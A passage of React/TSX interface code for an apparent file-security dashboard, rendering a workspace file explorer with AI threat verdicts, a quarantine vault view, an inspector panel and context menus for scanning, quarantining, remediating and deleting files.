              <div className="flex-1 overflow-y-auto p-4 space-y-5 text-xs">
                {isLoadingExplorer ? (
                  <div className="py-20 text-center space-y-3">
                    <RefreshCw className="w-6 h-6 text-blue-400 animate-spin mx-auto" />
                    <p className="text-[#8E8E93] text-xs">Loading directory contents...</p>
                  </div>
                ) : (
                  <>
                    {/* SECTION 1: DIRECTORIES */}
                    {explorerData?.directories && explorerData.directories.length > 0 && (
                      <div className="space-y-2">
                        <div className="flex items-center justify-between text-[10px] font-semibold text-[#8E8E93] uppercase tracking-wider px-1">
                          <span>Directories ({explorerData.directories.length})</span>
                          <span>Click to browse</span>
                        </div>

                        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-2.5">
                          {explorerData.directories.map((dir) => (
                            <div
                              key={dir.subpath}
                              onClick={() => fetchExplorerData(dir.subpath)}
                              className="p-3 rounded-xl bg-white/[0.03] hover:bg-white/[0.07] border border-white/[0.06] hover:border-blue-500/30 flex items-center gap-3 cursor-pointer transition-all group apple-button"
                            >
                              <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-blue-500/20 to-indigo-500/20 border border-blue-500/20 flex items-center justify-center text-blue-300 group-hover:scale-105 transition-transform">
                                <Folder className="w-4 h-4 fill-blue-400/20 text-blue-400" />
                              </div>
                              <div className="min-w-0 flex-1">
                                <div className="font-semibold text-white text-xs truncate group-hover:text-blue-300 transition-colors">
                                  {dir.name}
                                </div>
                                <div className="text-[10px] text-[#8E8E93] flex items-center gap-1.5 mt-0.5">
                                  <span>{dir.item_count} items</span>
                                  {dir.modified_at && (
                                    <>
                                      <span>•</span>
                                      <span>{new Date(dir.modified_at).toLocaleDateString()}</span>
                                    </>
                                  )}
                                </div>
                              </div>
                              <ChevronRight className="w-4 h-4 text-[#636366] group-hover:text-white transition-colors" />
                            </div>
                          ))}
                        </div>
                      </div>
                    )}

                    {/* Quarantined Artifacts Status Banner for Explorer View */}
                    {quarantinedFiles.length > 0 && (!explorerPath || explorerPath === "") && (
                      <div className="p-3 px-4 rounded-xl bg-purple-500/10 border border-purple-500/25 flex items-center justify-between text-xs text-purple-200">
                        <div className="flex items-center gap-2.5">
                          <ShieldCheck className="w-4 h-4 text-purple-400 flex-shrink-0" />
                          <span>
                            <strong>{quarantinedFiles.length} threat artifacts</strong> have been isolated in the <span className="font-mono text-purple-300">.quarantine</span> security enclave.
                          </span>
                        </div>
                        <button
                          onClick={() => setDisplayMode("quarantine")}
                          className="px-2.5 py-1 rounded-lg bg-purple-500/20 hover:bg-purple-500/30 text-[11px] font-semibold text-purple-200 transition-colors apple-button flex items-center gap-1"
                        >
                          <Lock className="w-3 h-3 text-purple-400" />
                          <span>View Vault &rarr;</span>
                        </button>
                      </div>
                    )}

                    {/* SECTION 2: FILES IN DIRECTORY */}
                    <div className="space-y-2">
                      <div className="flex items-center justify-between text-[10px] font-semibold text-[#8E8E93] uppercase tracking-wider px-1">
                        <span>Files ({sortedExplorerFiles.length})</span>
                        <span>Click row to inspect • Right-click for actions</span>
                      </div>

                      {sortedExplorerFiles.length === 0 ? (
                        <div className="py-12 text-center text-[#8E8E93] border border-dashed border-white/[0.08] rounded-2xl p-6 space-y-3">
                          {quarantinedFiles.length > 0 && (!explorerPath || explorerPath === "") ? (
                            <>
                              <ShieldCheck className="w-10 h-10 text-emerald-400 mx-auto opacity-80" />
                              <div className="space-y-1 max-w-md mx-auto">
                                <p className="text-white font-medium text-xs">Workspace Root Is Clean & Contained</p>
                                <p className="text-[11px] text-[#8E8E93]">
                                  All {quarantinedFiles.length} detected threat files in this workspace have been safely neutralized and isolated into the <span className="font-mono text-purple-300">.quarantine</span> enclave.
                                </p>
                              </div>
                              <div className="pt-2">
                                <button
                                  onClick={() => setDisplayMode("quarantine")}
                                  className="px-3.5 py-1.5 rounded-xl bg-purple-500/20 hover:bg-purple-500/30 border border-purple-500/30 text-purple-300 text-xs font-semibold inline-flex items-center gap-1.5 transition-all apple-button"
                                >
                                  <Lock className="w-3.5 h-3.5" />
                                  <span>Inspect Quarantine Vault ({quarantinedFiles.length} files)</span>
                                </button>
                              </div>
                            </>
                          ) : (
                            <>
                              <FolderOpen className="w-8 h-8 text-slate-600 mx-auto" />
                              <p className="text-white font-medium text-xs">No files in this folder</p>
                              <p className="text-[11px] text-[#8E8E93]">Use "+ Add File" above or navigate to a different directory.</p>
                            </>
                          )}
                        </div>
                      ) : (
                        <div className="rounded-xl border border-white/[0.06] overflow-hidden divide-y divide-white/[0.04]">
                          {/* Explorer File Columns */}
                          <div className="grid grid-cols-12 gap-2 px-4 py-2 bg-white/[0.02] text-[10px] font-semibold text-[#8E8E93] uppercase tracking-wider select-none">
                            <div
                              onClick={() => handleToggleSort("name")}
                              className="col-span-6 flex items-center gap-1 cursor-pointer hover:text-white"
                            >
                              <span>File Name</span>
                              {sortField === "name" && (sortDirection === "asc" ? <ChevronUp className="w-3 h-3 text-blue-400" /> : <ChevronDown className="w-3 h-3 text-blue-400" />)}
                            </div>
                            <div
                              onClick={() => handleToggleSort("size")}
                              className="col-span-2 hidden md:flex items-center gap-1 cursor-pointer hover:text-white"
                            >
                              <span>Size</span>
                              {sortField === "size" && (sortDirection === "asc" ? <ChevronUp className="w-3 h-3 text-blue-400" /> : <ChevronDown className="w-3 h-3 text-blue-400" />)}
                            </div>
                            <div
                              onClick={() => handleToggleSort("verdict")}
                              className="col-span-6 md:col-span-4 flex items-center justify-end gap-1 cursor-pointer hover:text-white text-right"
                            >
                              <span>AI Verdict</span>
                              {sortField === "verdict" && (sortDirection === "asc" ? <ChevronUp className="w-3 h-3 text-blue-400" /> : <ChevronDown className="w-3 h-3 text-blue-400" />)}
                            </div>
                          </div>

                          {/* Explorer File Rows */}
                          {sortedExplorerFiles.map((file) => {
                            const Icon = getFileIcon(file.extension);
                            const isSelected = selectedFile?.filepath === file.filepath || selectedFile?.filename === file.filename;
                            const isAnalyzing = file.verdict === "ANALYZING";

                            return (
                              <div
                                key={file.filepath || file.relative_path || file.filename}
                                onClick={() => setSelectedFile(file)}
                                onContextMenu={(e) => handleContextMenu(e, file)}
                                className={`p-3 px-4 flex items-center justify-between cursor-pointer transition-all select-none ${
                                  isSelected
                                    ? "bg-white/[0.08] border-l-2 border-blue-400"
                                    : "hover:bg-white/[0.035] border-l-2 border-transparent"
                                } ${isAnalyzing ? "bg-blue-500/[0.05]" : ""}`}
                              >
                                <div className="flex items-center gap-3 min-w-0 flex-1 pr-3">
                                  <div className={`w-8 h-8 rounded-lg flex items-center justify-center flex-shrink-0 ${
                                    file.verdict === "UNSAFE" ? "bg-rose-500/15 text-rose-400" :
                                    file.verdict === "VULNERABLE" ? "bg-amber-500/15 text-amber-400" :
                                    file.verdict === "SAFE" ? "bg-emerald-500/15 text-emerald-400" :
                                    "bg-white/[0.05] text-[#8E8E93]"
                                  }`}>
                                    <Icon className="w-4 h-4" />
                                  </div>

                                  <div className="min-w-0">
                                    <div className="flex items-center gap-2">
                                      <span className="font-semibold text-white text-xs truncate">
                                        {file.filename}
                                      </span>
                                      {file.relative_path && file.relative_path.includes("/") && (
                                        <span className="text-[9px] px-1.5 py-0.2 rounded bg-blue-500/10 text-blue-300 font-mono border border-blue-500/20">
                                          {file.relative_path.substring(0, file.relative_path.lastIndexOf("/"))}
                                        </span>
                                      )}
                                    </div>
                                    <div className="text-[10px] text-[#8E8E93] flex items-center gap-2 mt-0.5">
                                      <span>{(file.size_bytes / 1024).toFixed(1)} KB</span>
                                      <span>•</span>
                                      <span>Entropy: {file.entropy}</span>
                                    </div>
                                  </div>
                                </div>

                                <div className="flex items-center gap-3 flex-shrink-0">
                                  {isAnalyzing ? (
                                    <span className="inline-flex items-center gap-1.5 text-[10px] px-2.5 py-1 rounded-full bg-blue-500/15 text-blue-300 font-semibold border border-blue-500/30 animate-pulse">
                                      <RefreshCw className="w-3 h-3 animate-spin" />
                                      <span>Analyzing...</span>
                                    </span>
                                  ) : file.verdict === "UNSAFE" ? (
                                    <div className="flex items-center gap-1.5 flex-wrap justify-end">
                                      {/* Harmful Threat Badge with Risk Score */}
                                      <span className="inline-flex items-center gap-1.5 text-[10px] px-2.5 py-1 rounded-full bg-rose-500/20 text-rose-300 font-semibold border border-rose-500/35 shadow-sm shadow-rose-950/40">
                                        <AlertTriangle className="w-3 h-3 text-rose-400" />
                                        <span>UNSAFE • {file.threat_category || "Threat"}</span>
                                        {file.risk_score !== undefined && (
                                          <span className="ml-1 px-1.5 py-0.2 rounded-full bg-rose-950/70 text-rose-200 font-mono text-[9px] border border-rose-500/30">
                                            {file.risk_score}/100
                                          </span>
                                        )}
                                      </span>

                                      {/* Quick Action Options on Badge for Harmful File */}
                                      <div className="flex items-center gap-1" onClick={(e) => e.stopPropagation()}>
                                        {onNavigateToMitigation && (
                                          <button
                                            onClick={() => onNavigateToMitigation({
                                              fileName: file.filename,
                                              filePath: file.filepath,
                                              threatCategory: file.threat_category || "Malware",
                                              severity: file.severity || "HIGH"
                                            })}
                                            className="px-2 py-0.8 rounded-lg bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/40 text-[10px] font-semibold flex items-center gap-1 transition-all apple-button"
                                            title="Quick Mitigate in Copilot"
                                          >
                                            <Zap className="w-2.5 h-2.5 text-amber-400" />
                                            <span>Mitigate</span>
                                          </button>
                                        )}

                                        <button
                                          onClick={() => handleQuarantineFile(file)}
                                          className="px-2 py-0.8 rounded-lg bg-rose-600/20 hover:bg-rose-600/30 text-rose-300 border border-rose-500/35 text-[10px] font-semibold flex items-center gap-1 transition-all apple-button"
                                          title="Quick Quarantine"
                                        >
                                          <Lock className="w-2.5 h-2.5 text-rose-400" />
                                          <span>Quarantine</span>
                                        </button>
                                      </div>
                                    </div>
                                  ) : file.verdict === "VULNERABLE" ? (
                                    <div className="flex items-center gap-1.5 flex-wrap justify-end">
                                      {/* Vulnerable Code Badge */}
                                      <span className="inline-flex items-center gap-1.5 text-[10px] px-2.5 py-1 rounded-full bg-amber-500/20 text-amber-300 font-semibold border border-amber-500/35 shadow-sm shadow-amber-950/40">
                                        <AlertCircle className="w-3 h-3 text-amber-400" />
                                        <span>VULNERABLE • {file.vulnerability_details?.title || file.threat_category || "Code Flaw"}</span>
                                        {file.risk_score !== undefined && (
                                          <span className="ml-1 px-1.5 py-0.2 rounded-full bg-amber-950/70 text-amber-200 font-mono text-[9px] border border-amber-500/30">
                                            {file.risk_score}/100
                                          </span>
                                        )}
                                      </span>

                                      {/* Specialized Mitigating Options beside Badge */}
                                      <div className="flex items-center gap-1" onClick={(e) => e.stopPropagation()}>
                                        <button
                                          onClick={() => handleApplyVulnerabilityRemediation(file, "SPECIALIZED")}
                                          className="px-2 py-0.8 rounded-lg bg-indigo-600/20 hover:bg-indigo-600/30 text-indigo-300 border border-indigo-500/35 text-[10px] font-semibold flex items-center gap-1 transition-all apple-button"
                                          title="Quick Specialized Mitigation: Apply secure pattern"
                                        >
                                          <Shield className="w-2.5 h-2.5 text-indigo-400" />
                                          <span>
                                            {file.vulnerability_details?.vulnerability_type === "SQL_INJECTION" ? "Parameterize" :
                                             file.vulnerability_details?.vulnerability_type === "COMMAND_INJECTION" ? "Safe Subprocess" :
                                             file.vulnerability_details?.vulnerability_type === "HARDCODED_SECRET" ? "Move to Env" :
                                             file.vulnerability_details?.vulnerability_type === "PATH_TRAVERSAL" ? "Sanitize Path" :
                                             file.vulnerability_details?.vulnerability_type === "INSECURE_DESERIALIZATION" ? "SafeLoader" : "Patch Flaw"}
                                          </span>
                                        </button>

                                        <button
                                          onClick={() => setRemediationModal({ visible: true, file, isApplying: false })}
                                          className="px-2 py-0.8 rounded-lg bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/40 text-[10px] font-semibold flex items-center gap-1 transition-all apple-button"
                                          title="Inspect Vulnerability & Remediate"
                                        >
                                          <Wrench className="w-2.5 h-2.5 text-amber-400" />
                                          <span>Remediate</span>
                                        </button>
                                      </div>
                                    </div>
                                  ) : file.verdict === "SAFE" ? (
                                    <div className="flex items-center gap-2">
                                      <span className="inline-flex items-center gap-1.5 text-[10px] px-2.5 py-1 rounded-full bg-emerald-500/15 text-emerald-400 font-semibold border border-emerald-500/25">
                                        <CheckCircle2 className="w-3 h-3 text-emerald-400" />
                                        <span>SAFE</span>
                                        {file.risk_score !== undefined && (
                                          <span className="ml-1 text-[9px] font-mono text-emerald-500/80">
                                            {file.risk_score}/100
                                          </span>
                                        )}
                                      </span>
                                    </div>
                                  ) : (
                                    <button
                                      onClick={(e) => {
                                        e.stopPropagation();
                                        analyzeSingleFile(file);
                                      }}
                                      className="inline-flex items-center gap-1 text-[10px] px-2.5 py-1 rounded-full bg-white/[0.05] hover:bg-white/[0.1] text-[#8E8E93] hover:text-white font-medium border border-white/[0.08] transition-all apple-button"
                                    >
                                      <Play className="w-2.5 h-2.5" />
                                      <span>Scan</span>
                                    </button>
                                  )}

                                  <button
                                    onClick={(e) => handleContextMenu(e, file)}
                                    className="p-1 rounded-lg text-[#8E8E93] hover:text-white hover:bg-white/[0.08]"
                                  >
                                    <MoreVertical className="w-3.5 h-3.5" />
                                  </button>
                                </div>
                              </div>
                            );
                          })}
                        </div>
                      )}
                    </div>
                  </>
                )}
              </div>
            </>
          ) : (
            /* ============================================================= */
            /* MODE C: QUARANTINED FILES VAULT & ISOLATION ENCLAVE           */
            /* ============================================================= */
            <>
              {/* Quarantined Header Enclave Bar */}
              <div className="p-3.5 px-4 border-b border-white/[0.07] bg-amber-500/[0.03] flex flex-wrap items-center justify-between gap-3 text-xs">
                <div className="flex items-center gap-2.5">
                  <div className="w-7 h-7 rounded-lg bg-amber-500/15 border border-amber-500/30 flex items-center justify-center">
                    <Lock className="w-4 h-4 text-amber-400" />
                  </div>
                  <div>
                    <div className="flex items-center gap-2">
                      <span className="font-semibold text-white">monitored_workspace/.quarantine/</span>
                      <span className="px-2 py-0.5 rounded-full bg-amber-500/20 text-amber-300 font-mono text-[9px] border border-amber-500/30">
                        Zero-Execution Enclave (chmod 000)
                      </span>
                    </div>
                    <div className="text-[10px] text-[#8E8E93] mt-0.5">
                      {filteredQuarantinedFiles.length} isolated artifacts • Defused payload headers • Threat Isolation Active
                    </div>
                  </div>
                </div>

                <div className="flex items-center gap-2 text-[10px] text-[#8E8E93]">
                  <span className="hidden sm:inline">Right-click or click &quot;...&quot; for actions: Restore, Exclude, Purge, Deep Scan</span>
                  <button
                    onClick={() => fetchQuarantinedFiles()}
                    disabled={isLoadingQuarantined}
                    className="p-1.5 px-2.5 rounded-lg bg-white/[0.05] hover:bg-white/[0.1] text-slate-300 flex items-center gap-1 transition-all apple-button"
                  >
                    <RefreshCw className={`w-3 h-3 ${isLoadingQuarantined ? "animate-spin text-amber-400" : ""}`} />
                    <span>Refresh</span>
                  </button>
                </div>
              </div>

              {/* Quarantined Column Headers */}
              <div className="grid grid-cols-12 gap-2 px-4 py-2.5 bg-white/[0.015] border-b border-white/[0.06] text-[10px] font-semibold text-[#8E8E93] uppercase tracking-wider select-none">
                <div className="col-span-5 flex items-center gap-1">
                  <span>Isolated File & SHA-256 Hash</span>
                </div>
                <div className="col-span-3 hidden md:flex items-center gap-1">
                  <span>Original Workspace Path</span>
                </div>
                <div className="col-span-2 hidden sm:flex items-center gap-1">
                  <span>Size & Entropy</span>
                </div>
                <div className="col-span-2 text-right">
                  <span>Actions</span>
                </div>
              </div>

              {/* Quarantined Rows Container */}
              <div className="flex-1 divide-y divide-white/[0.04] overflow-y-auto max-h-[580px]">
                {isLoadingQuarantined && quarantinedFiles.length === 0 ? (
                  <div className="p-12 flex flex-col items-center justify-center text-center space-y-3">
                    <RefreshCw className="w-6 h-6 text-amber-400 animate-spin" />
                    <p className="text-xs text-[#8E8E93]">Loading quarantined enclave records...</p>
                  </div>
                ) : filteredQuarantinedFiles.length === 0 ? (
                  <div className="p-12 flex flex-col items-center justify-center text-center space-y-2">
                    <div className="w-10 h-10 rounded-2xl bg-white/[0.03] flex items-center justify-center text-[#8E8E93] mb-1">
                      <Lock className="w-5 h-5 text-emerald-400" />
                    </div>
                    <p className="text-xs text-white font-medium">Quarantine Enclave Empty</p>
                    <p className="text-[11px] text-[#8E8E93] max-w-sm">
                      No files are currently quarantined. Threats detected by FIM or AI Threat Scanner can be quarantined here to safely defuse them.
                    </p>
                  </div>
                ) : (
                  filteredQuarantinedFiles.map((qFile) => (
                    <div
                      key={qFile.quarantine_path}
                      onContextMenu={(e) => handleQuarantineContextMenu(e, qFile)}
                      onClick={() => setSelectedQuarantinedForInspect(qFile)}
                      className="grid grid-cols-12 gap-2 items-center px-4 py-3 hover:bg-white/[0.035] transition-all cursor-pointer group"
                    >
                      {/* Name + Hash */}
                      <div className="col-span-12 sm:col-span-5 flex items-center gap-3 min-w-0">
                        <div className="w-8 h-8 rounded-xl bg-amber-500/15 border border-amber-500/25 flex items-center justify-center flex-shrink-0 text-amber-400">
                          <Lock className="w-4 h-4" />
                        </div>
                        <div className="min-w-0 flex-1">
                          <div className="flex items-center gap-2">
                            <span className="font-semibold text-white text-xs truncate group-hover:text-amber-300 transition-colors">
                              {qFile.filename}
                            </span>
                            <span className="px-1.5 py-0.2 rounded bg-rose-500/20 text-rose-300 font-mono text-[9px] border border-rose-500/30">
                              DEFUSED
                            </span>
                          </div>
                          <div className="flex items-center gap-2 mt-0.5 text-[10px] text-[#8E8E93]">
                            <span className="font-mono text-slate-400">
                              {qFile.sha256 ? `${qFile.sha256.slice(0, 12)}...` : "SHA256 pending"}
                            </span>
                            {qFile.sha256 && (
                              <button
                                onClick={(e) => {
                                  e.stopPropagation();
                                  handleCopySha256(qFile.sha256!);
                                }}
                                className="p-0.5 rounded hover:bg-white/[0.1] text-slate-400 hover:text-white"
                                title="Copy SHA-256"
                              >
                                <Copy className="w-2.5 h-2.5" />
                              </button>
                            )}
                            <span>•</span>
                            <span className="text-[10px] text-slate-500">
                              {qFile.quarantined_at ? new Date(qFile.quarantined_at).toLocaleTimeString() : "Isolated"}
                            </span>
                          </div>
                        </div>
                      </div>

                      {/* Original Path */}
                      <div className="col-span-12 sm:col-span-3 hidden md:flex items-center text-[11px] text-slate-300 font-mono truncate">
                        <span className="truncate" title={qFile.original_path}>
                          {qFile.original_path || `monitored_workspace/${qFile.filename}`}
                        </span>
                      </div>

                      {/* Size & Entropy */}
                      <div className="col-span-12 sm:col-span-2 hidden sm:flex flex-col justify-center text-[10px] text-[#8E8E93]">
                        <span className="text-slate-300 font-mono">{(qFile.size_bytes / 1024).toFixed(1)} KB</span>
                        <div className="flex items-center gap-1 mt-0.5">
                          <span>Entropy:</span>
                          <span className={`font-mono font-semibold ${
                            (qFile.entropy || 0) > 7.0 ? "text-rose-400" :
                            (qFile.entropy || 0) > 5.5 ? "text-amber-400" : "text-emerald-400"
                          }`}>
                            {qFile.entropy ?? "N/A"}
                          </span>
                        </div>
                      </div>

                      {/* Actions */}
                      <div className="col-span-12 sm:col-span-2 flex items-center justify-end gap-1.5" onClick={(e) => e.stopPropagation()}>
                        {/* Direct Restore Button */}
                        <button
                          onClick={() => handleRestoreQuarantined(qFile)}
                          className="px-2.5 py-1 rounded-lg bg-emerald-500/15 hover:bg-emerald-500/25 text-emerald-300 border border-emerald-500/30 text-[10px] font-semibold flex items-center gap-1 transition-all apple-button"
                          title="Restore file to original location"
                        >
                          <RotateCcw className="w-3 h-3 text-emerald-400" />
                          <span className="hidden lg:inline">Restore</span>
                        </button>

                        {/* Three-Dot Button triggering Context Menu */}
                        <button
                          onClick={(e) => handleQuarantineContextMenu(e, qFile)}
                          className="p-1.5 rounded-lg text-[#8E8E93] hover:text-white hover:bg-white/[0.08] transition-colors"
                          title="Actions: Restore, Add to exclusion, Delete, Deep scan"
                        >
                          <MoreVertical className="w-4 h-4" />
                        </button>
                      </div>
                    </div>
                  ))
                )}
              </div>
            </>
          )}
        </div>

        {/* SIDE INSPECTOR PANEL (Right Pane when a file is selected) */}
        {selectedFile && displayMode !== "quarantine" && (
          <div className="lg:col-span-5 apple-panel p-5 flex flex-col h-[600px] border border-white/[0.08] space-y-4 overflow-y-auto">
            {/* Inspector Header */}
            <div className="flex items-center justify-between border-b border-white/[0.08] pb-3">
              <div className="flex items-center gap-2.5">
                <div className="w-8 h-8 rounded-xl bg-white/[0.06] flex items-center justify-center">
                  <FileCode2 className="w-4 h-4 text-blue-400" />
                </div>
                <div>
                  <h3 className="font-semibold text-white text-xs truncate max-w-[200px]">
                    {selectedFile.filename}
                  </h3>
                  <span className="text-[10px] text-[#8E8E93] font-mono">
                    {(selectedFile.size_bytes / 1024).toFixed(1)} KB • Entropy {selectedFile.entropy}
                  </span>
                </div>
              </div>

              <button
                onClick={() => setSelectedFile(null)}
                className="p-1.5 rounded-lg hover:bg-white/[0.08] text-[#8E8E93] hover:text-white"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            {/* AI Verdict Summary Banner */}
            <div className={`p-3.5 rounded-xl border space-y-2 ${
              selectedFile.verdict === "UNSAFE"
                ? "bg-rose-500/[0.08] border-rose-500/30"
                : selectedFile.verdict === "VULNERABLE"
                ? "bg-amber-500/[0.08] border-amber-500/30"
                : selectedFile.verdict === "SAFE"
                ? "bg-emerald-500/[0.06] border-emerald-500/25"
                : "bg-white/[0.025] border-white/[0.06]"
            }`}>
              <div className="flex items-center justify-between">
                <span className="text-[10px] text-[#8E8E93] uppercase font-semibold">Classification Verdict</span>
                <span className={`text-[10px] font-semibold px-2 py-0.5 rounded-full ${
                  selectedFile.verdict === "UNSAFE" ? "bg-rose-500/20 text-rose-300" :
                  selectedFile.verdict === "VULNERABLE" ? "bg-amber-500/20 text-amber-300" :
                  selectedFile.verdict === "SAFE" ? "bg-emerald-500/20 text-emerald-400" :
                  "bg-white/[0.08] text-slate-300"
                }`}>
                  {selectedFile.verdict}
                </span>
              </div>

              <div className="flex items-baseline justify-between pt-1">
                <div className="font-semibold text-white text-xs">
                  {selectedFile.vulnerability_details?.title || selectedFile.threat_category || "Unclassified File"}
                </div>
                {selectedFile.risk_score !== undefined && (
                  <span className="text-[10px] font-mono text-slate-300">
                    Risk: <strong className="text-white">{selectedFile.risk_score}</strong>/100
                  </span>
                )}
              </div>

              {selectedFile.vulnerability_details?.cwe && (
                <div className="text-[10px] font-mono text-amber-300/90 pt-0.5">
                  CWE Reference: <strong>{selectedFile.vulnerability_details.cwe}</strong>
                </div>
              )}

              {selectedFile.summary && (
                <p className="text-[11px] text-[#8E8E93] leading-relaxed pt-1">
                  {selectedFile.summary}
                </p>
              )}
            </div>

            {/* Quick Actions Bar */}
            <div className="flex flex-wrap items-center gap-2 pt-1">
              <button
                onClick={() => analyzeSingleFile(selectedFile)}
                className="flex-1 px-3 py-1.5 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-semibold text-xs flex items-center justify-center gap-1.5 apple-button shadow-sm"
              >
                <Play className="w-3 h-3 fill-current" />
                <span>Re-Analyze with {selectedModel.split("/").pop()}</span>
              </button>

              {selectedFile.verdict === "UNSAFE" && onNavigateToMitigation && (
                <button
                  onClick={() => onNavigateToMitigation({
                    fileName: selectedFile.filename,
                    filePath: selectedFile.filepath,
                    threatCategory: selectedFile.threat_category || "Malware",
                    severity: selectedFile.severity || "HIGH"
                  })}
                  className="px-3 py-1.5 rounded-xl bg-amber-600 hover:bg-amber-500 text-white font-semibold text-xs flex items-center gap-1.5 apple-button"
                >
                  <Zap className="w-3 h-3" />
                  <span>Mitigate</span>
                </button>
              )}

              {selectedFile.verdict === "VULNERABLE" && (
                <button
                  onClick={() => setRemediationModal({ visible: true, file: selectedFile, isApplying: false })}
                  className="px-3 py-1.5 rounded-xl bg-gradient-to-r from-amber-600 to-amber-500 hover:from-amber-500 hover:to-amber-400 text-white font-semibold text-xs flex items-center gap-1.5 apple-button shadow-sm"
                >
                  <Wrench className="w-3 h-3" />
                  <span>Remediate Flaw</span>
                </button>
              )}

              <button
                onClick={() => handleQuarantineFile(selectedFile)}
                className="p-2 rounded-xl bg-white/[0.05] hover:bg-rose-500/20 text-[#8E8E93] hover:text-rose-300 border border-white/[0.08] apple-button"
                title="Quarantine file"
              >
                <Lock className="w-3.5 h-3.5" />
              </button>
            </div>

            {/* Code / Content Preview */}
            <div className="space-y-1.5 flex-1 flex flex-col min-h-0 pt-2">
              <div className="flex items-center justify-between text-[10px] text-[#8E8E93]">
                <span className="font-mono">Content Preview (First 1500 bytes):</span>
                <button
                  onClick={() => {
                    navigator.clipboard.writeText(selectedFile.content_preview);
                    toast.success("Content copied to clipboard.");
                  }}
                  className="flex items-center gap-1 hover:text-white"
                >
                  <Copy className="w-3 h-3" />
                  <span>Copy</span>
                </button>
              </div>

              <pre className="flex-1 p-3.5 rounded-xl bg-black/60 border border-white/[0.08] font-mono text-[11px] text-slate-300 overflow-auto leading-relaxed select-text">
                {selectedFile.content_preview || "(Empty content or binary format)"}
              </pre>
            </div>
          </div>
        )}
      </div>

      {/* =================================================================== */}
      {/* RIGHT-CLICK POPUP CONTEXT MENU (Native macOS Apple Design)          */}
      {/* =================================================================== */}
      <AnimatePresence>
        {contextMenu.visible && contextMenu.file && (
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            transition={{ type: "spring", bounce: 0, duration: 0.15 }}
            style={{
              position: "fixed",
              top: contextMenu.y,
              left: contextMenu.x,
              zIndex: 100
            }}
            className="w-56 p-1.5 rounded-2xl bg-[#0D111E]/95 backdrop-blur-2xl border border-white/[0.12] shadow-2xl space-y-0.5 text-xs select-none"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="px-2.5 py-1.5 text-[10px] font-mono text-[#8E8E93] border-b border-white/[0.06] truncate">
              {contextMenu.file.filename}
            </div>

            {/* 1. Run AI Threat Analysis */}
            <button
              onClick={() => {
                analyzeSingleFile(contextMenu.file!);
                setContextMenu(prev => ({ ...prev, visible: false }));
              }}
              className="w-full flex items-center gap-2.5 px-2.5 py-1.5 rounded-xl text-left text-white hover:bg-blue-600/30 hover:text-blue-200 transition-all text-xs"
            >
              <Zap className="w-3.5 h-3.5 text-blue-400" />
              <span>Scan with {selectedModel.split("/").pop()}</span>
            </button>

            {/* 2. Inspect Code */}
            <button
              onClick={() => {
                setSelectedFile(contextMenu.file);
                setContextMenu(prev => ({ ...prev, visible: false }));
              }}
              className="w-full flex items-center gap-2.5 px-2.5 py-1.5 rounded-xl text-left text-white hover:bg-white/[0.08] transition-all text-xs"
            >
              <Eye className="w-3.5 h-3.5 text-[#8E8E93]" />
              <span>Inspect Code & Telemetry</span>
            </button>

            {/* 3. Vulnerability Remediation (for Vulnerable Code) */}
            {contextMenu.file.verdict === "VULNERABLE" && (
              <button
                onClick={() => {
                  setRemediationModal({ visible: true, file: contextMenu.file!, isApplying: false });
                  setContextMenu(prev => ({ ...prev, visible: false }));
                }}
                className="w-full flex items-center gap-2.5 px-2.5 py-1.5 rounded-xl text-left text-amber-300 hover:bg-amber-500/20 transition-all text-xs font-semibold"
              >
                <Wrench className="w-3.5 h-3.5 text-amber-400" />
                <span>Remediate Flaw (SAST Patch)</span>
              </button>
            )}

            {/* 4. Quarantine File */}
            <button
              onClick={() => {
                handleQuarantineFile(contextMenu.file!);
                setContextMenu(prev => ({ ...prev, visible: false }));
              }}
              className="w-full flex items-center gap-2.5 px-2.5 py-1.5 rounded-xl text-left text-amber-300 hover:bg-amber-500/20 transition-all text-xs"
            >
              <Lock className="w-3.5 h-3.5 text-amber-400" />
              <span>Quarantine to Enclave</span>
            </button>

            {/* 5. Whitelist Suppression */}
            <button
              onClick={() => {
                handleAddToWhitelist(contextMenu.file!);
                setContextMenu(prev => ({ ...prev, visible: false }));
              }}
              className="w-full flex items-center gap-2.5 px-2.5 py-1.5 rounded-xl text-left text-blue-300 hover:bg-blue-500/20 transition-all text-xs"
            >
              <Shield className="w-3.5 h-3.5 text-blue-400" />
              <span>Add to Suppression Whitelist</span>
            </button>

            {/* 5. Mitigate in Copilot */}
            {onNavigateToMitigation && (
              <button
                onClick={() => {
                  onNavigateToMitigation({
                    fileName: contextMenu.file!.filename,
                    filePath: contextMenu.file!.filepath,
                    threatCategory: contextMenu.file!.threat_category || "Malware",
                    severity: contextMenu.file!.severity || "HIGH"
                  });
                  setContextMenu(prev => ({ ...prev, visible: false }));
                }}
                className="w-full flex items-center gap-2.5 px-2.5 py-1.5 rounded-xl text-left text-amber-400 hover:bg-amber-500/20 transition-all text-xs"
              >
                <Terminal className="w-3.5 h-3.5" />
                <span>Send to Mitigation Queue</span>
              </button>
            )}

            <div className="border-t border-white/[0.06] my-1" />

            {/* 6. Delete File */}
            <button
              onClick={() => {
                handleDeleteFile(contextMenu.file!);
                setContextMenu(prev => ({ ...prev, visible: false }));
              }}
              className="w-full flex items-center gap-2.5 px-2.5 py-1.5 rounded-xl text-left text-rose-400 hover:bg-rose-500/20 transition-all text-xs"
            >
              <Trash2 className="w-3.5 h-3.5" />
              <span>Delete from Workspace</span>
            </button>
          </motion.div>
        )}

        {/* Quarantined File Right-Click / 3-Dot Actions Menu */}
        {contextMenu.visible && contextMenu.quarantinedFile && (
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            transition={{ type: "spring", bounce: 0, duration: 0.15 }}
            style={{
              position: "fixed",
              top: contextMenu.y,
              left: contextMenu.x,
              zIndex: 100
            }}
            className="w-64 p-1.5 rounded-2xl bg-[#0D111E]/95 backdrop-blur-2xl border border-white/[0.12] shadow-2xl space-y-0.5 text-xs select-none"
            onClick={(e) => e.stopPropagation()}
          >
